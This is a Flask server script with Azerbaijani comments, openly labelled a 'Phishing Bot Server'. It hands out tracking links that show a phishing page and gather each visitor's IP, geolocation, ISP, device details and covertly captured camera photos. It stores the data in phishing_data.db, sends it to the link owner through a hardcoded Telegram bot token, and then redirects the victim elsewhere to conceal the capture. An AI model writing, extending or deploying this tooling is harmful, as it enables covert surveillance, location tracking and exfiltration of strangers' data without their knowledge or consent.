from flask import Flask, render_template, request, jsonify, redirect, url_for
from flask_cors import CORS
import sqlite3
import json
import requests
from datetime import datetime
import threading
import time
import os
import uuid

# Qurban məlumatlarını göndərmək
def send_victim_data_to_user(user_id, victim_data):
    """Qurban məlumatlarını Telegram istifadəçisinə göndərmək"""
    try:
        BOT_TOKEN = "7317862412:AAF_SaKYUI4kTqDamXElz8EQYA5v5EZD7AE"
        # Bot API vasitəsilə mesaj göndərmək
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        
        # Məlumatları formatlamaq
        message = f"""
🎯 **Yeni qurban məlumatları!**

🌐 **Əsas məlumatlar:**
📍 IP: `{victim_data.get('ip', 'N/A')}`
🌍 Konum: `{victim_data.get('location', 'N/A')}`
💻 Brauzer: `{victim_data.get('browser', 'N/A')}`
🖥️ OS: `{victim_data.get('os', 'N/A')}`
📱 Cihaz: `{victim_data.get('device', 'N/A')}`

📊 **Texniki məlumatlar:**
🖼️ Ekran: `{victim_data.get('screen', 'N/A')}`
🕐 Vaxt zonası: `{victim_data.get('timezone', 'N/A')}`
🌐 Dil: `{victim_data.get('language', 'N/A')}`
📡 ISP: `{victim_data.get('isp', 'N/A')}`

⏰ Vaxt: `{victim_data.get('timestamp', 'N/A')}`
"""
        
        data = {
            'chat_id': user_id,
            'text': message,
            'parse_mode': 'Markdown'
        }
        
        response = requests.post(url, data=data)
        
        # Əgər kamera şəkli varsa, onu da göndərmək
        if victim_data.get('camera_image'):
            photo_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
            photo_data = {
                'chat_id': user_id,
                'caption': '📸 Qurbanın kamera şəkli'
            }
            files = {'photo': victim_data['camera_image']}
            requests.post(photo_url, data=photo_data, files=files)
            
    except Exception as e:
        print(f"Məlumat göndərmə xətası: {e}")

app = Flask(__name__)
CORS(app)

# Verilənlər bazası əlaqəsi
def get_db_connection():
    conn = sqlite3.connect('phishing_data.db')
    conn.row_factory = sqlite3.Row
    return conn

# IP məlumatlarını əldə etmək
def get_ip_info(ip_address):
    try:
        response = requests.get(f"http://ip-api.com/json/{ip_address}")
        if response.status_code == 200:
            return response.json()
    except:
        pass
    return {}

# Əsas səhifə
@app.route('/')
def index():
    return """
    <h1>Phishing Bot Server</h1>
    <p>Server işləyir. Telegram botundan link əldə edin.</p>
    """

# Phishing səhifəsi
@app.route('/p/<link_id>')
def phishing_page(link_id):
    # Link mövcudluğunu və aktiv olub-olmadığını yoxlamaq
    conn = get_db_connection()
    link = conn.execute('SELECT * FROM user_links WHERE link_id = ? AND is_active = 1', (link_id,)).fetchone()
    
    if not link:
        conn.close()
        return """
        <html>
        <head><title>Link Tapılmadı</title></head>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h1>❌ Link Tapılmadı</h1>
            <p>Bu link mövcud deyil və ya deaktiv edilib.</p>
        </body>
        </html>
        """, 404
    
    # Klik sayını artırmaq
    conn.execute('UPDATE user_links SET clicks = clicks + 1 WHERE link_id = ? AND is_active = 1', (link_id,))
    conn.commit()
    conn.close()
    
    # Phishing səhifəsini göstərmək
    return render_template('phishing.html', link_id=link_id)

# Məlumat toplama endpoint-i
@app.route('/collect/<link_id>', methods=['POST'])
def collect_data(link_id):
    try:
        # Gələn məlumatları əldə etmək
        data = request.get_json()
        
        # IP məlumatlarını əldə etmək
        client_ip = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
        ip_info = get_ip_info(client_ip)
        
        # Bütün məlumatları birləşdirmək
        victim_data = {
            'ip': client_ip,
            'location': f"{ip_info.get('city', 'N/A')}, {ip_info.get('country', 'N/A')}",
            'coordinates': f"{ip_info.get('lat', 'N/A')}, {ip_info.get('lon', 'N/A')}",
            'isp': ip_info.get('isp', 'N/A'),
            'browser': data.get('browser', 'N/A'),
            'os': data.get('os', 'N/A'),
            'device': data.get('device', 'N/A'),
            'screen': data.get('screen', 'N/A'),
            'timezone': data.get('timezone', 'N/A'),
            'language': data.get('language', 'N/A'),
            'user_agent': request.headers.get('User-Agent', 'N/A'),
            'referrer': request.headers.get('Referer', 'N/A'),
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        
        # Verilənlər bazasına yazmaq
        conn = get_db_connection()
        
        # Link sahibini tapmaq və aktiv olub-olmadığını yoxlamaq
        link_owner = conn.execute('SELECT user_id FROM user_links WHERE link_id = ? AND is_active = 1', (link_id,)).fetchone()
        
        if link_owner:
            # Məlumatları bazaya yazmaq
            conn.execute('''
                INSERT INTO victim_data 
                (link_id, ip_address, user_agent, browser_info, os_info, 
                 screen_resolution, timezone, language, referrer, location_data, 
                 device_info, network_info, additional_data)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (
                link_id, client_ip, request.headers.get('User-Agent', ''),
                data.get('browser', ''), data.get('os', ''),
                data.get('screen', ''), data.get('timezone', ''),
                data.get('language', ''), request.headers.get('Referer', ''),
                json.dumps(ip_info), data.get('device', ''),
                ip_info.get('isp', ''), json.dumps(data)
            ))
            conn.commit()
            
            # Telegram istifadəçisinə məlumatları göndərmək
            send_victim_data_to_user(link_owner['user_id'], victim_data)
        
        conn.close()
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        print(f"Məlumat toplama xətası: {e}")
        return jsonify({'status': 'error'}), 500

# Kamera şəklini qəbul etmək
@app.route('/upload_image/<link_id>', methods=['POST'])
def upload_image(link_id):
    try:
        if 'image' not in request.files:
            return jsonify({'status': 'error', 'message': 'Şəkil tapılmadı'}), 400
        
        file = request.files['image']
        if file.filename == '':
            return jsonify({'status': 'error', 'message': 'Fayl seçilməyib'}), 400
        
        # Şəkli saxlamaq
        filename = f"camera_{link_id}_{int(time.time())}.jpg"
        filepath = os.path.join('static', 'uploads', filename)
        
        # Upload qovluğunu yaratmaq
        os.makedirs(os.path.dirname(filepath), exist_ok=True)
        file.save(filepath)
        
        # Link sahibini tapmaq və şəkli göndərmək
        conn = get_db_connection()
        link_owner = conn.execute('SELECT user_id FROM user_links WHERE link_id = ? AND is_active = 1', (link_id,)).fetchone()
        
        if link_owner:
            # Telegram-a şəkil göndərmək
            with open(filepath, 'rb') as photo:
                url = f"https://api.telegram.org/bot7317862412:AAF_SaKYUI4kTqDamXElz8EQYA5v5EZD7AE/sendPhoto"
                files = {'photo': photo}
                data = {
                    'chat_id': link_owner['user_id'],
                    'caption': f'📸 Kamera şəkli (Link: {link_id})'
                }
                requests.post(url, files=files, data=data)
        
        conn.close()
        return jsonify({'status': 'success'})
        
    except Exception as e:
        print(f"Şəkil yükləmə xətası: {e}")
        return jsonify({'status': 'error'}), 500

# Hədəf URL-ə yönləndirmə endpoint-i
@app.route('/redirect/<link_id>')
def redirect_to_target(link_id):
    try:
        # Link məlumatlarını əldə etmək
        conn = get_db_connection()
        link = conn.execute('SELECT target_url FROM user_links WHERE link_id = ? AND is_active = 1', (link_id,)).fetchone()
        conn.close()
        
        if link and link['target_url']:
            target_url = link['target_url']
            # Əgər URL düzgün formatda deyilsə, düzəltmək
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'https://' + target_url
            return redirect(target_url)
        else:
            # Əgər hədəf URL tapılmasa, Google-a yönləndirmək
            return redirect('https://www.google.com')
            
    except Exception as e:
        print(f"Yönləndirmə xətası: {e}")
        # Xəta halında Google-a yönləndirmək
        return redirect('https://www.google.com')

if __name__ == '__main__':
    # Flask serveri işə salmaq
    app.run(host='0.0.0.0', port=5000, debug=True)